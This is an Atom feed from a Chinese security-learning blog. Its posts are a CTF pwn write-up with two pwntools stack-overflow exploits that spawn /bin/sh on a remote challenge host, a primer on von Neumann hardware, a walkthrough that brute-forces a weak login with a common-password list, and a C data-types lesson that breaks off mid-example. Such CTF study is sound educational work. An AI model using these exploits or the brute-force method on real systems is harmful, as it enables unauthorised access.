<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-07-04T14:37:00.456Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【看雪CTF-pwn】一鸣惊人的栈溢出</title>
    <link href="https://muzibing.github.io/2020/07/04/2020.07.04%EF%BC%88134%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/04/2020.07.04（134）/</id>
    <published>2020-07-03T16:00:00.000Z</published>
    <updated>2020-07-04T14:37:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>      这道题目真的太坑了，不过也给我提了一个醒，就是<code>在做题时不能对IDA pro反编译的伪代码过于相信</code>，在感觉有问题的地方，一定自己用<code>GDB</code>调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。</p><h3 id="font-color-navy0x00-准备工作font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-准备工作font"></a> <font color="navy"><code>0x00 准备工作</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file ymjr </span><br><span class="line"></span><br><span class="line">ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以看出该文件是32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec ymjr </span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>该ELF文件只开启了栈不可执行保护</p></blockquote><p><img src="/images/134-1.png" alt></p><blockquote><p>从上图的IDA中可以看出，gets()函数中的变量<code>v4</code>在栈中被分配的空间为<code>0x64</code>，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图：</p></blockquote><p><img src="/images/134-2.png" alt></p><blockquote><p>从上图中可以看出，v4距<code>esp</code>的距离有<code>0x1c</code>，esp中的地址为<code>0xffffd860</code>，那么v4的地址为<code>0xffffd87c</code>。这个时候ebp中地址为<code>0xffffd8e8</code>，那么<code>v4</code>与<code>ebp</code>的距离为<code>0xffffd8e8-0xffffd87c=108（0x6c）</code>，示意图如下：</p></blockquote><p><img src="/images/134-3.png" alt></p><h3 id="font-color-navy0x01-姿势一font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-姿势一font"></a> <font color="navy"><code>0x01 姿势一</code></font></h3><blockquote><p>直接让返回地址跳转到<code>system(&quot;/bin/sh&quot;)</code>处</p></blockquote><p>     我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
  <entry>
    <title>【科普】冯·诺依曼结构与具体实现</title>
    <link href="https://muzibing.github.io/2020/07/03/2020.07.03%EF%BC%88133%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/03/2020.07.03（133）/</id>
    <published>2020-07-02T16:00:00.000Z</published>
    <updated>2020-07-03T07:24:55.662Z</updated>
    
    <content type="html"><![CDATA[<h4 id="font-color-navy1冯诺依曼计算的主要构成font"><a class="markdownIt-Anchor" href="#font-color-navy1冯诺依曼计算的主要构成font"></a> <font color="navy">1.冯·诺依曼计算的主要构成</font></h4><p>      冯·诺依曼计算机主要是由五大部分构成：</p><ol><li>运算器（CA）：Central Arithmetical</li><li>控制器（CC）：Central Contral</li><li>存储器（M）：Memory</li><li>输入设备（I）：Input</li><li>输出设备（O）：Output</li></ol><p>      除了上述五部分，还有一个<code>外部记录介质 R</code>(outside Recording medium)，示意图如下：</p><p><img src="/images/133-1.png" alt></p><blockquote><p>下面我们就来看看和具体实现是如何对应的呢？</p></blockquote><h4 id="font-color-navy2冯诺依曼结构原理与实现的对应font"><a class="markdownIt-Anchor" href="#font-color-navy2冯诺依曼结构原理与实现的对应font"></a> <font color="navy">2.冯·诺依曼结构原理与实现的对应</font></h4><p><img src="/images/133-2.png" alt></p><p>      如上图，它们一一对应关系如下：</p><blockquote><ul><li>CPU ⇢ 运算器 CA和控制器 CC</li><li>主存 ⇢ 存储器 M</li><li>键盘 ⇢ 输入设备 I</li><li>硬盘、显示器 ⇢  输出设备</li></ul></blockquote><p>      在这里要说明的是主板上的<code>北桥</code>、<code>南桥</code>和<code>BIOS</code>三个部件</p><p><code>北桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。</span><br></pre></td></tr></table></figure><p><code>南桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。</span><br></pre></td></tr></table></figure><p><code>BIOS</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？</span><br><span class="line">是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。</span><br><span class="line">CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在</span><br></pre></td></tr></table></figure><p>      目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。</p><h4 id="font-color-navy3南北桥架构的演变font"><a class="markdownIt-Anchor" href="#font-color-navy3南北桥架构的演变font"></a> <font color="navy">3.南北桥架构的演变</font></h4><p><code>演变（1）</code></p><p><img src="/images/133-3.png" alt></p><p>      上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。</p><p>      下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是<code>CPU访问主存的通道</code>，所以在南北桥上发生的第一个变化如下。</p><p><code>演变（2）</code></p><p><img src="/images/133-4.png" alt></p><p>      如上图，在南北桥上发生的第一个变化，就是<strong>北桥的主控制器被移到了CPU芯片中</strong>，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。</p><p><code>演变（3）</code></p><p><img src="/images/133-5.png" alt></p><p>     如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。</p><p><code>演变（4）</code></p><p><img src="/images/133-6.png" alt></p><p>      什么是系统芯片呢？系统芯片<code>就是将计算机或其他电子系统集成为单一芯片的集成电路</code>，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理<code>摩尔定律</code></p><h4 id="font-color-navy4摩尔定律font"><a class="markdownIt-Anchor" href="#font-color-navy4摩尔定律font"></a> <font color="navy">4.摩尔定律</font></h4><p><code>摩尔定律原型</code></p><p>      1965年，摩尔在《电子学》杂志上预测：<code>在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年</code>。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，<code>在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年</code>。</p><p><code>现在摩尔定律的描述</code></p><p>      现在摩尔定律常被描述为：<code>当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;1.冯·诺依
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【web安全】爆破用户登录弱口令</title>
    <link href="https://muzibing.github.io/2020/07/01/2020.07.01%EF%BC%88132%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/01/2020.07.01（132）/</id>
    <published>2020-06-30T16:00:00.000Z</published>
    <updated>2020-07-01T08:04:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如<code>123456789</code>、<code>88888888</code>等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下<font color="navy"><code>弱口令</code></font>为什么不安全的。</p><p><code>情景假设</code></p><blockquote><p>加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。</p></blockquote><p><img src="/images/132-1.png" alt></p><h4 id="font-color-navy1创建字典font"><a class="markdownIt-Anchor" href="#font-color-navy1创建字典font"></a> <font color="navy">1.创建字典</font></h4><p>     情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">a123456</span><br><span class="line">123456</span><br><span class="line">a123456789</span><br><span class="line">1234567890</span><br><span class="line">woaini1314</span><br><span class="line">qq123456</span><br><span class="line">abc123456</span><br><span class="line">123456a</span><br><span class="line">123456789a</span><br><span class="line">147258369</span><br><span class="line">zxcvbnm</span><br><span class="line">987654321</span><br><span class="line">12345678910</span><br><span class="line">abc123</span><br><span class="line">qq123456789</span><br><span class="line">123456789.</span><br><span class="line">7708801314520</span><br><span class="line">woaini</span><br><span class="line">5201314520</span><br><span class="line">q123456</span><br><span class="line">123456abc</span><br><span class="line">1233211234567</span><br><span class="line">123123123</span><br><span class="line">123456.</span><br><span class="line">0123456789</span><br><span class="line">asd123456</span><br><span class="line">aa123456</span><br><span class="line">135792468</span><br><span class="line">q123456789</span><br><span class="line">abcd123456</span><br><span class="line">12345678900</span><br><span class="line">woaini520</span><br><span class="line">woaini123</span><br><span class="line">zxcvbnm123</span><br><span class="line">1111111111111111</span><br><span class="line">w123456</span><br><span class="line">aini1314</span><br><span class="line">abc123456789</span><br><span class="line">111111</span><br><span class="line">woaini521</span><br><span class="line">qwertyuiop</span><br><span class="line">1314520520</span><br><span class="line">1234567891</span><br><span class="line">qwe123456</span><br><span class="line">asd123</span><br><span class="line">000000</span><br><span class="line">1472583690</span><br><span class="line">1357924680</span><br><span class="line">789456123</span><br><span class="line">123456789abc</span><br><span class="line">z123456</span><br><span class="line">1234567899</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2爆破密码font"><a class="markdownIt-Anchor" href="#font-color-navy2爆破密码font"></a> <font color="navy">2.爆破密码</font></h4><p>      在这里我们要用到一个抓包工具<code>Burp Suit</code>（666666），它长下面这个样子：</p><p><img src="/images/132-2.png" alt></p><p>      下面我用动图R的形式来展示一下爆破的整个过程：</p><p><img src="/images/132-3.gif" alt></p><blockquote><p>可以从上图中看出，管理员密码为<code>123456</code>，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如&lt;code&gt;123456789&lt;/cod
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列二】 C语言中的基本数据类型</title>
    <link href="https://muzibing.github.io/2020/06/26/2020.06.24%EF%BC%88131%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/26/2020.06.24（131）/</id>
    <published>2020-06-25T16:00:00.000Z</published>
    <updated>2020-06-26T11:00:38.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基本数据类型font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基本数据类型font"></a> <font color="navy"><code>0x00 基本数据类型</code></font></h3><p><img src="/images/131-1.png" alt></p><table><thead><tr><th style="text-align:center"><font size="2">基本类型</font></th><th style="text-align:center"><font size="2">字节</font></th><th style="text-align:center"><font size="2">范围</font></th></tr></thead><tbody><tr><td style="text-align:center"><font size="2">char</font></td><td style="text-align:center"><font size="2">1byte</font></td><td style="text-align:center"><font size="2">—</font></td></tr><tr><td style="text-align:center"><font color="navy" size="2">short</font></td><td style="text-align:center"><font size="2">2bytes</font></td><td style="text-align:center"><font size="2">0~32767(0~0x7fff)<br>-32768~-1(0x8000~0xffff)</font></td></tr><tr><td style="text-align:center"><font size="2">int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~2147483647(0~0x7fffffff)<br>-2147483648~-1(0x80000000~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~4294967295(0~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">正: 0~0x7fffffffffffffff<br>负: 0x8000000000000000~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">0~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">float</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">|3.4e-38|~|3.4e+38|</font></td></tr><tr><td style="text-align:center"><font size="2">double</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">|1.7e-308|~|1.7e+308|</font></td></tr></tbody></table><blockquote><p>下面我们用一个示例代码打印一下这些基本的数据类型，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function: 打印基本数据类型的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of char is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of short is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of long int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of float is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of double is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The size of char is 1 bytes</span><br><span class="line">The size of short is 2 bytes</span><br><span class="line">The size of int is 4 bytes</span><br><span class="line">The size of long int is 4 bytes</span><br><span class="line">The size of float is 4 bytes</span><br><span class="line">The size of double is 8 bytes</span><br></pre></td></tr></table></figure><blockquote><p><font size="2">需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes</font></p></blockquote><h4 id="font-color-blue-1有符号和无符号font"><a class="markdownIt-Anchor" href="#font-color-blue-1有符号和无符号font"></a> <font color="blue"><code>1.有符号和无符号</code></font></h4><p>      对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——<code>计算机怎么知道数值是有符号的还是无符号的呢？</code>众所周知，数值在计算机内部的存储方式是以<code>0 1</code>方式进行存储的，比如数值<code>4</code>在16位环境下的存储形式为<code>0000 0000 0000 0100</code>，很简单就能知道这是一个正数4，那么如果存储的是<code>-4</code>呢？（<font color="green" size="2">大家思考一下负数在内存的存储方式</font>），要知道<code>-4</code>在内存是以它的补码形式进行存储的，首先来看<code>-4</code>从原码到补码的转变：<code>1</code> <code>000 0100</code> <font size="2">（原码）</font>⇥ <code>1</code> <code>111 1011</code><font size="2">（反码）</font>⇥ <code>1</code> <code>111 1100</code> <font size="2">（补码）</font>，那么<code>-4</code>在内存的存储形式为<code>0xfc</code>，下面我们可以看一下32位环境下的无符号和有符号定义下<code>-4</code>和<code>4</code>的存储形式，是否和我们推导的一致呢？如下图：</p><p><img src="/images/131-2.png" alt></p><p>      从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。</p><blockquote><p><font color="red"><strong>知识点一</strong></font>：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。</p></blockquote><p>     这里通过一个简单的程序引出下面的问题，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">2147483649</span>, usum;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>, sum;</span><br><span class="line">        usum = i + j;</span><br><span class="line">    sum = i + j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %d (d)\n"</span>,usum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %u (u)\n"</span>,usum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %d (d)\n"</span>,sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %u (u)\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在看下方结果之前，大家先思考一下应该是什么结果？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">usum = 214783649 + 1 = 2147483650 (u)</span><br><span class="line">sum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">sum = 214783649 + 1 = 2147483650 (u)</span><br></pre></td></tr></table></figure><blockquote><p>看到上面的输出结果，我猜大家可能会有这样的问题：</p><ul><li>i和j都是正数，两个数相加之后怎么成负数了？</li><li>为什么格式符不同，输出的结果也不通呢？</li><li>usum是<code>unsigned int</code>类型，怎么成为了负数呢？</li></ul><p>下面我们一步一步的来进行解析。</p></blockquote><p>      首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过<code>add eax,edx</code>进行的，其中将<code>eax</code>和<code>edx</code>中的二进制相加，然后把结果存储到寄存器<code>eax</code>中，所以说<code>214783649 + 1</code>对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候<code>符号位</code>才参与计算<sup>[1]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   214783649     1000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">+          1   +0000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">-------------   